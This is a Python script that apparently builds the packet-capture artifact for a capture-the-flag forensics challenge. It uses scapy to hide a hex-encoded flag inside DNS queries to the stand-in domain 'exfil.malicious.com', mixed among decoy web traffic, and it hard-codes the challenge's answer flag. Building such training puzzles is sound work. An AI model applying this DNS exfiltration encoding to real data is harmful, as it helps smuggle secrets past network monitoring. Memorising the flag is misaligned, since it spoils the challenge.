#!/usr/bin/env python3
"""
Script to generate the PCAP artifact for the 'Suspicious Traffic' challenge.
This script creates a packet capture with DNS exfiltration data.
"""

import os
import sys

# Ensure the artifacts directory exists
artifacts_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "artifacts")
os.makedirs(artifacts_dir, exist_ok=True)

# Target PCAP file path
pcap_file = os.path.join(artifacts_dir, "capture.pcap")

def check_dependencies():
    """Check if scapy is installed."""
    try:
        from scapy.all import IP
        return True
    except ImportError:
        print("Error: Scapy not found.")
        print("Please install scapy with: pip install scapy")
        return False

def create_pcap():
    """Create the PCAP file with the exfiltrated flag data."""
    try:
        from scapy.all import IP, UDP, TCP, DNS, DNSQR, wrpcap, Raw
        
        # Create a list to hold packets
        packets = []
        
        # Flag for exfiltration
        FLAG = "flag{DNS_3xf1ltr4t10n_1s_cl3v3r}"
        
        print("Creating PCAP file with DNS exfiltration...")
        
        # Add some normal traffic (HTTP, HTTPS, etc.)
        for i in range(20):
            packets.append(IP(dst="142.250.180.4")/TCP(dport=443)/Raw(b"Normal HTTPS traffic"))
            packets.append(IP(dst="172.217.167.36")/TCP(dport=80)/Raw(b"Normal HTTP traffic"))
        
        # Convert flag to hex format suitable for DNS queries
        flag_hex = "".join([f"{ord(c):02x}" for c in FLAG])
        
        # Split the hex flag into chunks
        chunk_size = 10
        flag_chunks = [flag_hex[i:i+chunk_size] for i in range(0, len(flag_hex), chunk_size)]
        
        # Add dots between each pair of hex characters for readability in DNS names
        flag_chunks_dotted = []
        for chunk in flag_chunks:
            dotted = ".".join([chunk[i:i+2] for i in range(0, len(chunk), 2)])
            flag_chunks_dotted.append(dotted)
        
        # Create DNS queries for each part of the flag
        for i, part in enumerate(flag_chunks_dotted):
            # Create subdomain with hex-encoded flag part
            query = f"{part}.exfil.malicious.com"
            
            # Add the DNS query packet
            packets.append(IP(dst="10.0.0.53")/UDP(dport=53)/DNS(
                rd=1,
                qd=DNSQR(qname=query)
            ))
        
        # Add some more normal traffic to obscure the exfiltration
        for i in range(20):
            packets.append(IP(dst="13.107.42.14")/TCP(dport=443)/Raw(b"More normal traffic"))
        
        # Write the packets to a PCAP file
        wrpcap(pcap_file, packets)
        print(f"Created PCAP file at {pcap_file}")
        return True
    except Exception as e:
        print(f"Error creating PCAP file: {e}")
        return False

def main():
    """Main function to create the challenge artifact."""
    # Check if the PCAP file already exists
    if os.path.exists(pcap_file):
        print(f"PCAP file already exists at {pcap_file}")
        return True
    
    # Check dependencies
    if not check_dependencies():
        return False
    
    # Create the PCAP file
    return create_pcap()

if __name__ == "__main__":
    main() 